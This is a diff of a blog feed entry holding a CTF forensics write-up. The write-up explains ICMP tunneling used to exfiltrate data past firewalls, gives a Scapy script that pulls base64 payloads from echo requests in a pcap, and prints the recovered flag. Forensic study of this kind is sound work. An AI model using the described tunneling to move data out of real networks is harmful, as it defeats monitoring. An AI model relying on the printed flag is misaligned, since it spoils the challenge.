-&lt;p&gt;The ICMP protocol is pretty simple and does not contain a lot of information. However, it includes a &lt;strong&gt;data field&lt;/strong&gt; used notably in error messages. This data field can also be used for creating an &lt;strong&gt;ICMP tunnel&lt;/strong&gt; between two remote computers where hosts inject data into icmp echo packets. This method is often used to &lt;strong&gt;bypass firewall rules&lt;/strong&gt; in the aim of &lt;strong&gt;exfiltrating data&lt;/strong&gt;.
-Such process can be detected by analyzing ICMP echo packets’ size. These packets usually don’t exceed 100 bytes. Here, each of them is 542 bytes long.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/icmp_packet_size.png&quot; alt=&quot;ICMP packet size&quot; title=&quot;ICMP Packet size&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We definitively should have a look at what takes so much space.&lt;/p&gt;
-
-&lt;h2 id=&quot;gimme-your-data&quot;&gt;Gimme your data!&lt;/h2&gt;
-
-&lt;p&gt;I wrote a simple python script &lt;strong&gt;extracting the data section&lt;/strong&gt; of ICMP echo request packets. For this, I used the &lt;strong&gt;Scapy&lt;/strong&gt; module, which is for me the best tool when it comes to handling packet captures, due to its effectiveness and simplicity of use. My script also &lt;strong&gt;converts extracted data to ASCII&lt;/strong&gt; because it occured to be base64 encoded, which is not surprising since it avoids encoding errors during the transmission.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'analysis.pcap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Echo request&lt;/span&gt;
-       &lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ping_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;NOTE: I only kept request packets since replies send back same data and can cause errors when recovering exfiltrated data.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The hidden text reveals to be a part of the very famous &lt;em&gt;“Hacker Manifesto”&lt;/em&gt; followed by the man page of the “ping” tool.
-Right between the two texts lies our reward… :triangular_flag_on_post:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I am a hacker, and this is my manifesto.  You may stop this individual,
-but you can't stop us all... after all, we're all alike.
-
-                              +++The Mentor+++
-
-
-Congratulations, ICMP exfiltatration is awesome! The flag is : ndh2k18_017395f4c6312759
-
-
-
-Now let's read the manual of one of the best tools you never had!
-
-PING(8)                                  System Manager's Manual: iputils                                  PING(8)
-
-NAME
-      ping - send ICMP ECHO_REQUEST to network hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">An interesting forensic challenge covering a famous method of data exfiltration…</summary></entry></feed>
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.</summary></entry></feed>
